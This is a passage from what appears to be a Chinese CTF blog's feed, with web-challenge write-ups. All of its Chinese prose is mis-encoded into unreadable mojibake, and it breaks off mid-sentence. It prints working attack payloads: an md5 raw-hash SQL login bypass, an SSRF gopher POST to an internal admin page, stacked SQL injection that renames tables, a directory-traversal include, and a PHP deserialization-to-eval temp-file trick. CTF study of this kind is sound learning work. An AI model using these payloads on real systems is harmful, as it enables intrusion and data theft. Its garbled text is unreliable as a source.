class="number">5</span>); <span class="comment">//01234</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//æœ‰å›è°ƒæ—¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$v</span> + <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">5</span>, <span class="string">&#x27;f1&#x27;</span>); <span class="comment">//02468</span></span><br></pre></td></tr></table></figure></li><li><p>åŒ¿åå‡½æ•°ï¼šå…è®¸ä¸´æ—¶åˆ›å»ºä¸€ä¸ªæ²¡æœ‰æŒ‡å®šåç§°çš„å‡½æ•°ã€‚æœ€ç»å¸¸ç”¨ä½œå›è°ƒå‡½æ•°<code>callable</code>å›è°ƒå‚æ•°çš„å€¼</p></li></ul><p>è€Œ<code>preg_replace_callback</code>é™¤äº†å¯ä»¥æŒ‡å®šä¸€ä¸ª <code>callback</code> æ›¿ä»£ <code>replacement</code> è¿›è¡Œæ›¿æ¢å­—ç¬¦ä¸²çš„è®¡ç®—ï¼Œå…¶ä»–æ–¹é¢ç­‰åŒäº<code>preg_replace</code></p><p>è‡³äºä»€ä¹ˆ<code>$this-&gt;hive</code>ä¹‹ç±»çš„æ‚ä¸ƒæ‚å…«çš„éƒ½æ˜¯åé¢æ‰åŠ ä¸Šå»çš„ï¼Œå’Œ<code>compile()</code>æ— å…³</p><p>å› ä¸ºä¼ å‚<code>a</code>ä¼šè¢«<code>compile</code>å¤„ç†ä¸º<code>[&#39;xxx&#39;]</code>çš„å½¢å¼ï¼Œæ‰€ä»¥éœ€è¦æ‰“ç ´è¿™ç§æ ¼å¼ï¼Œç„¶åç‚¹å·è¿æ¥å¹¶é—­åˆ<code>unset</code>ï¼Œæœ€å<code>eval</code>æ‰§è¡Œä»»æ„ä»£ç </p><p>çœ‹çœ‹è¿™ä¸ªæ­£åˆ™<code>&#39;/\.([^.\[\]]+)|\[((?:[^\[\]\&#39;&quot;]*|(?R))*)\]/&#39;</code>ï¼Œå¹¶æ²¡æœ‰åŒ¹é…æ¢è¡Œç¬¦ï¼Œæ‰€ä»¥å‡ºäº†æ¢è¡Œç¬¦è¿™ä¸ªæ­£åˆ™å°±ä¼šè¢«æ‰“æ–­ï¼Œäºæ˜¯ä¾¿è¶…åº¦æˆåŠŸ</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-%E6%8D%A2%E8%A1%8C%E7%AC%A6.png"></p><h2 id="æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ"><a href="#æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ" class="headerlink" title="æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ"></a>æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ</h2><blockquote>æè¿°ï¼šè¿™ä¸ªsqlå§ï¼Œæœ‰ç‚¹ssrfçš„æ ·å­ï¼Œé¦–é¡µæ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„sqlæ³¨å…¥ï¼Œæ²¡æœ‰ä»€ä¹ˆèŠ±æ ·ï¼Œä½†æ˜¯æˆ‘çš„admin.phpæ˜¯ä¸€ä¸ªå†…ç½‘çš„ç®¡ç†ç³»ç»Ÿï¼Œåªè¦ä½ ç”¨â€œçœŸ-adminâ€çš„å¯†ç ç™»å½•äº†ï¼Œå°±å¯ä»¥æ‹¿åˆ°flag</blockquote><blockquote>hintï¼šç¬¬ä¸€æ­¥ç™»å½•çš„sqlè¯­å¥æ˜¯"SELECT * FROM users WHERE password = '".md5($password,true)."' limit 0,1";</blockquote><p>è¿™ä¸ªé¢˜æ²¡æœ‰æ€ä¹ˆåŠ¨ï¼Œç›®å‰ä¹Ÿæ²¡æ‰¾åˆ°å¤ç°ï¼Œæš‚æ—¶åªèƒ½é¢å‘wpæ‰«ç›²</p><h3 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-%E7%99%BB%E5%BD%95.png"></p><p>å…³é”®å­—æ˜¯<code>md5($password,true)</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°<code>raw=true</code>å³è½¬md5ååˆåšä¸€æ¬¡<code>hex2str</code></p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>raw</em></td><td align="left">å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼FALSE - é»˜è®¤ã€‚32 å­—ç¬¦åå…­è¿›åˆ¶æ•°</td></tr></tbody></table><p>æ‰€ä»¥hintæè¿°çš„è¿™ä¸€æ­¥å…¶å®æ˜¯md5ä¸‡èƒ½å¯†ç ï¼š<code>ffifdyop</code>ä¸<code>129581926211651571912466741651878684928</code>åœ¨ç»è¿‡md5å¹¶è½¬å­—ç¬¦åå‡åŒ…å«æœ‰<code>&#39;or&#39;</code>ï¼Œåªè¦<code>&#39;or&#39;</code>å³è¾¹éé›¶ï¼Œå³ä¼šåˆ¤å®šæ•´ä¸ªè¡¨è¾¾å¼ä¸ºtrueï¼Œä»¥æ­¤ä¾¿ç»•è¿‡äº†ç™»å½•</p><h3 id="gopheråè®®"><a href="#gopheråè®®" class="headerlink" title="gopheråè®®"></a>gopheråè®®</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-gopher.png"></p><blockquote>gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œåœ¨æ„æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®®</blockquote><p>SSRFï¼šServer-side Request Forgeï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼›è¯´ç™½äº†å°±æ˜¯ï¼š<i>å› ä¸ºæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·ï¼Œä»è€Œèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿ</i> çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæ¯”å¦‚é€šè¿‡file://ï¼Œgopher://ä¹‹ç±»çš„åè®®æ¥è¯»æœ¬åœ°æ–‡ä»¶ä»€ä¹ˆçš„</p><p>æœ¬é¢˜æ˜¯å±è”½äº†<code>file://</code>çš„ï¼Œåªèƒ½ç”¨<code>gopher://</code></p><p>Gopheråè®®æ ¼å¼ï¼š<code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_TCPæ•°æ®æµ</code></p><ul><li>gopherçš„é»˜è®¤ç«¯å£æ˜¯70</li><li>å¦‚æœå‘èµ·POSTè¯·æ±‚ï¼Œè¯·æ±‚ä½“éœ€è¦è¿›è¡Œurlç¼–ç ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨<code>%0d</code>æˆ–<code>%0a</code>ä»£æ›¿</li></ul><p>payloadï¼š/ssrf.php?way=127.0.0.1/admin.phpï¼Œå‘ç°admin.phpä¸å†302äº†</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-admin.png"></p><p>ç„¶åé€šè¿‡gopheråè®®ç»™admin.phpå‘POSTæ•°æ®ï¼ŒHTTPåè®®é»˜è®¤ç«¯å£æ˜¯80ï¼Œæ‰€ä»¥æ˜¯å¾€<code>127.0.0.1:80</code>å‘åŒ…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%20%2Fadmin.php%20HTTP%2F1.1%0aHost%3A%20127.0.0.1%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0aContent-Length%3A%2027%0ausername%3Dtest%26password%3Dtest%0a</span><br></pre></td></tr></table></figure><blockquote>gopher://127.0.0.1:80/<br>_POST /admin.php HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 27<br>username=test&password=test</blockquote><h3 id="æ”¹è¡¨å"><a href="#æ”¹è¡¨å" class="headerlink" title="æ”¹è¡¨å"></a>æ”¹è¡¨å</h3><p>é€šè¿‡æ”¹è¡¨åè·å–æ•°æ®@2019å¼ºç½‘æ¯ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>prepare</code>é¢„å¤„ç†<code>concat</code>è¿‡æ»¤çš„<code>select</code>ï¼Œé¢„å¤„ç†çš„æ–¹æ³•ä¹‹å‰å°±è®°å½•è¿‡ï¼Œä¸å†é‡å¤</p><p>å½“è¿‡æ»¤äº†<code>select</code>ï¼Œå°±ä¸èƒ½åœ¨æŸ¥å‡ºè¡¨ååˆ—ååé€‰ä¸­æ•°æ®ï¼Œä½†è‹¥æŸ¥è¯¢çš„å›æ˜¾å°±æ˜¯è¡¨ä¸­çš„å­—æ®µï¼Œåˆ™å¯ä»¥é€šè¿‡<code>rename</code>å°†é»˜è®¤æŸ¥è¯¢çš„è¡¨æ›¿æ¢ä¸ºç›®æ ‡è¡¨ï¼Œä»è€Œç›´æ¥ä»å›æ˜¾è·å–å­—æ®µ</p><p>ä¾‹å¦‚æœ¬é¢˜ä¸­<code>fake_admin</code>æ˜¯é»˜è®¤è¢«æŸ¥è¯¢çš„è¡¨ï¼Œ<code>real_admin_here_do_you_find</code>æ˜¯ç›®æ ‡è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; &quot;username&#x3D;admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;2;RENAME TABLE &#96;fake_admin&#96; TO &#96;fake_admin1&#96;;RENAME TABLE &#96;real_admin_here_do_you_find&#96; TO &#96;fake_admin&#96;;##&amp;password&#x3D;129581926211651571912466741651878684928&quot;;</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿è®°ä¸€ä¸‹ [2019å¼ºç½‘æ¯-éšä¾¿æ³¨] çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æ”¹åˆ—å<code>flag</code>ä¸º<code>id</code>æ˜¯å› ä¸ºç›®æ ‡è¡¨ä¸­æ²¡æœ‰<code>id</code>åˆ—ï¼Œè€ŒæŸ¥è¯¢æ˜¯æ ¹æ®idæŸ¥è¯¢ï¼Œé¿å…äº†ä¸€å¼€å§‹æ— æ³•æŸ¥è¯¢çš„æƒ…å†µ</p><p><code>CHANGE</code>çš„è¯­æ³•ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE t1 CHANGE c_old c_new INTEGER ;#æŠŠåä¸ºc_oldçš„åˆ—åæ”¹ä¸ºc_newï¼Œç±»å‹ä¸ºæ•´æ•°å‹</span><br></pre></td></tr></table></figure><h2 id="Internal-System"><a href="#Internal-System" class="headerlink" title="Internal System"></a>Internal System</h2><p>è¶…å‡ºèƒ½åŠ›èŒƒå›´çš„éƒ¨åˆ†æœ‰ç‚¹å¤šï¼Œç§¯ç´¯èµ·æ¥äº†å†è¯´</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;è®°å½•é¢˜ç›®æ‰«ç›²ï¼Œåªæœ‰å‰ä¸‰é¢˜ï¼ŒåŒ…å«ä»¥ä¸‹pointsï¼š&lt;/p&gt;
&lt;p&gt;â€‹    â‘ 3.28 php.netåé—¨&lt;/p&gt;
&lt;p&gt;â€‹    â‘¡3F(FatFreeFramework)æ¡†æ¶&lt;/p&gt;
&lt;p&gt;â€‹    â‘¢SQLä¸­md5()äº§ç”Ÿhexçš„â€™orâ€™è¿›è¡Œçš„æ³¨å…¥&lt;/p&gt;
&lt;p&gt;â€‹    â‘£SSRFä¸gopheråè®®&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="CTF" scheme="https://kyriota.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶</title>
    <link href="https://kyriota.github.io/2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/"/>
    <id>https://kyriota.github.io/2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/</id>
    <published>2021-03-28T13:14:32.000Z</published>
    <updated>2022-01-06T06:55:55.635Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥è‡ªäºBUUCTF_Webè§£å†³æ•°æœ€å¤šçš„[HCTF 2018]WarmUpï¼Œå°è®°ä¸€ä¸‹æ­¤é¢˜è¢«æˆ‘ç–å¿½çš„é›¶ç¢çŸ¥è¯†ä»¥åŠå‡ºé¢˜äººçš„è„‘æ´ï¼ˆè™½ç„¶ä¸å¤§ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºæ­¤é¢˜ä¸é¢å‘wpè€Œæ˜¯ç¡¬åšçš„è¯ä¸ä¼šæœ‰è¿™ä¹ˆå¤šè§£å†³æ•° Â¯\_(ãƒ„)_/Â¯</p><span id="more"></span><h1 id="PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶"><a href="#PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶" class="headerlink" title="PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶"></a>PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶</h1><p>é¦–å…ˆæ˜¯è„‘æ´ï¼Œæœ¬é¢˜hintï¼š<code>flag not here, and flag in ffffllllaaaagggg</code>ï¼Œè¿™ä¸ªåˆ«è‡´çš„flagä¼ è¾¾çš„æ˜¯ï¼šflagåœ¨ä¸Šç¿»4çº§ç›®å½•ä¸‹ã€‚è¿™ä¸ªé¢˜ä¸Šç¿»4çº§ç›®å½•æ°å¥½åˆ° linux æ ¹ç›®å½•ï¼Œæ‰€ä»¥æœ‰äº›wpä¸­å †å å¾ˆå¤šä¸ª<code>../</code>ä¹Ÿå¯ä»¥highlightåˆ°flagï¼ˆå¤§æ¦‚æ˜¯ä¸ºäº†é™ä½è„‘æ´å› ç´ çš„å­˜åœ¨æ„Ÿ</p><p>å†å°±æ˜¯æœ¬æ–‡æ ‡é¢˜ï¼Œæœ¬é¢˜éœ€è¦åœ¨<code>highlight_file(__FILE__)</code>çš„æƒ…å†µä¸‹æ„é€ payloadç»•è¿‡å…¶è¿‡æ»¤ï¼Œæœ€åç”±<code>include</code>åŒ…å«è¿›æ¥ã€‚ä½†æ˜¯ä¸ºäº†ç»•è¿‡å…¶è¿‡æ»¤ï¼Œä¼ ç»™includeçš„è·¯å¾„æ˜¯ï¼š<code>file=hint.php?/../../../../../ffffllllaaaagggg</code>ï¼Œæ­¤è·¯å¾„èƒ½æ‰“å¼€ffffllllaaaaggggçš„åŸå› åœ¨äº<code>hint.php?</code>è¿™ä¸ªæ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼Œåˆ™phpå°†å…¶è§†ä¸ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œflagåœ¨ä¸Šç¿» 4 å±‚åçš„ç›®å½•ä¸‹ï¼Œå› ä¸ºå·²ç»è¿›äº† hint.php? åˆ™è¿˜éœ€é€€å› 5 å±‚</p><blockquote>è¿™ç§è®¿é—®ä¸å­˜åœ¨çš„ç›®å½•ç„¶ååˆé€€å›æ¥çš„æ“ä½œåœ¨linuxçš„shellç¯å¢ƒä¸‹å¹¶ä¸æ”¯æŒï¼Œæ‰€ä»¥è¯´ä»¤æˆ‘æ„Ÿåˆ°å¥‡æ€ª</blockquote><p><img src="/images/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6_LinuxShell.PNG"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¥è‡ªäºBUUCTF_Webè§£å†³æ•°æœ€å¤šçš„[HCTF 2018]WarmUpï¼Œå°è®°ä¸€ä¸‹æ­¤é¢˜è¢«æˆ‘ç–å¿½çš„é›¶ç¢çŸ¥è¯†ä»¥åŠå‡ºé¢˜äººçš„è„‘æ´ï¼ˆè™½ç„¶ä¸å¤§ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºæ­¤é¢˜ä¸é¢å‘wpè€Œæ˜¯ç¡¬åšçš„è¯ä¸ä¼šæœ‰è¿™ä¹ˆå¤šè§£å†³æ•° Â¯\_(ãƒ„)_/Â¯&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="CTF" scheme="https://kyriota.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>miniL p</title>
    <link href="https://kyriota.github.io/2021/03/25/miniL_web_p/"/>
    <id>https://kyriota.github.io/2021/03/25/miniL_web_p/</id>
    <published>2021-03-25T15:40:17.000Z</published>
    <updated>2022-08-12T15:21:05.673Z</updated>
    
    <content type="html"><![CDATA[<p>è€ƒå¯Ÿphpä»£ç å®¡è®¡ï¼Œä¸´æ—¶æ–‡ä»¶çª—å£æœŸçš„åˆ©ç”¨ï¼Œä»¥åŠlinuxæŒ‡ä»¤çš„æŒæ¡ï¼Œå¯¹æˆ‘å¥½éš¾ï¼Œè¿˜å¥½æœ‰@blackWatchçš„wpå’ŒååŠ©</p><p>ï¼ˆæ®è¯´æ˜¯æŸåŸé¢˜æ¬è¿ï¼Œç¢äºé¢˜é‡å¤ªå°‘è€Œæ²¡æœ‰æ‰¾åˆ°åŸé¢˜åœ¨å“ªï¼Œä½†æ˜¯è¿™ä¸é‡è¦</p><span id="more"></span><h1 id="miniL-Web-p"><a href="#miniL-Web-p" class="headerlink" title="miniL Web p"></a>miniL Web p</h1><p align='right'><small>è¿™é¢˜å°±å«"p"ï¼Œæ²¡æœ‰æ‰“é”™/doge</small></p><p><img src="/images/miniL-Web-p-preview.PNG"></p><h2 id="å¾—åˆ°classes-php"><a href="#å¾—åˆ°classes-php" class="headerlink" title="å¾—åˆ°classes.php"></a>å¾—åˆ°classes.php</h2><p>ä¸€è¿›æ¥index.phpå·²é«˜äº®ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;classes.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>])) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    setcookie(<span class="string">&#x27;git&#x27;</span>, base64_encode(serialize(<span class="keyword">new</span> gitee(<span class="string">&#x27;index.php&#x27;</span>))));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.reload()&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    ob_end_flush();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$comp</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>]));</span><br><span class="line">highlight_file(<span class="variable">$comp</span>-&gt;file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">ä½ ç”¨ä¸Šäº†Gitï¼Œå¯æ˜¯ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼ˆæ‚²ï¼‰</span><br></pre></td></tr></table></figure><p>indexåŒ…å«äº†classes.phpï¼Œæ ¹æ®è¦æ±‚ä¼ ä¸€ä¸ªb64çš„cookieç”¨ä½œååºåˆ—åŒ–ï¼Œä»è€Œé«˜äº®classes.php</p><p>classes.phpå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gitee</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ä½ ç”¨ä¸Šäº†Gitï¼Œå¯æ˜¯ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼ˆæ‚²ï¼‰&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">github</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">        <span class="variable">$blacklist</span> = <span class="string">&quot;~!@#%^&amp;*()ï¼ˆï¼‰-_&#123;&#125;[]&#x27;\&quot;:,&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(str_split(<span class="variable">$blacklist</span>) <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$char</span>;</span><br><span class="line">            <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;cmd, <span class="variable">$char</span>) !== <span class="literal">false</span>) </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;serror&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_REAL_IP&quot;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// proxy_set_header X-Real-IP $remote_addr;</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;across the great ... nope&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ä½ ç”¨ä¸Šäº†Gitï¼Œå¯æ˜¯ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼ˆæ‚²ï¼‰</span><br></pre></td></tr></table></figure><h2 id="ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨"><a href="#ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨"></a><a href="https://www.anquanke.com/post/id/201136">ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨</a></h2><p>å¯è§æœ¬é¢˜çš„è§£é¢˜å…³é”®åœ¨äº<code>eval($this-&gt;cmd)</code>ï¼Œä½†åœ¨evalæ‰§è¡Œä¹‹å‰$cmdå·²ç»è¢«è¿‡æ»¤çš„åªå‰©ä¸ª<code>p</code>å’Œä¸€äº›å­—ç¬¦äº†ï¼Œè€Œå¯¹äºæ­¤é¢˜çš„è§£æ³•å…¶å®æ˜¯ç›¸å¯¹å›ºå®šçš„ï¼šå³ä½¿ç”¨shellå‘½ä»¤è°ƒç”¨ä¸Šä¼ çš„æ–‡ä»¶ï¼Œåˆ©ç”¨è¿™ä¸€çª—å£æœŸæ‰§è¡Œä»»æ„æˆ‘ä»¬å¸Œæœ›æœåŠ¡ç«¯æ‰§è¡Œçš„shellå‘½ä»¤</p><p><img src="/images/miniL-Web-p-timeWindow.PNG"></p><p>å¦‚ä½•åˆ©ç”¨ï¼š</p><ul><li><p>é¦–å…ˆç¡®å®šå¦‚ä½•åœ¨ä»…æœ‰è¿™ä¹ˆå°ç‚¹å­—ç¬¦é›†çš„æƒ…å†µä¸‹è®¿é—®åˆ°ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ { Windwosä¸‹ä¸´æ—¶æ–‡ä»¶ä¿å­˜åœ¨<code>C:/Windows/Temp/</code>ï¼Œå‘½åä¸ºphp[4ä¸ªéšæœºå­—ç¬¦].tmpï¼›Linuxä¸‹ä¿å­˜åœ¨<code>/tmp/</code>ï¼Œå‘½åä¸ºphp[éšæœº6ä¸ªå­—ç¬¦] } å¯ä»¥ç¡®å®šæˆ‘ä»¬è¦æ‰¾çš„æ˜¯è·¯å¾„ä¸º<code>tmp/phpxxxxxx</code>çš„æ–‡ä»¶ï¼Œç»“åˆLinuxä¸­çš„å•å­—ç¬¦é€šé…ç¬¦<code>?</code>ï¼Œå°±å¯ä»¥æ‰¾åˆ°å®ƒäº†</p>  <center><code>??p/p?p??????</code></center></li><li><p>ç°åœ¨ç¡®å®šä¸Šä¼ æ€æ ·çš„æ–‡ä»¶æ‰å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°flagï¼Œæ³¨æ„åˆ°åå¼•å· <code>`</code> æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè€Œphpä¸­åå¼•å·ä¸ºæ‰§è¡Œè¿ç®—ç¬¦</p>  <blockquote>PHPå°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ï¼›ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦çš„æ•ˆæœä¸å‡½æ•°shell_exec()ç›¸åŒã€‚ä½†è¿™ä¸€åˆ‡çš„å‰ææ˜¯æœåŠ¡ç«¯å…è®¸ä¸€ä¸ªè¿™ä¹ˆå±é™©çš„å‡½æ•°æ‰§è¡Œ</blockquote><p>  å¥å· <code>.</code> ä¹Ÿæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè¿™åœ¨Linuxä¸­å¯ä»¥æ‰§è¡Œshell 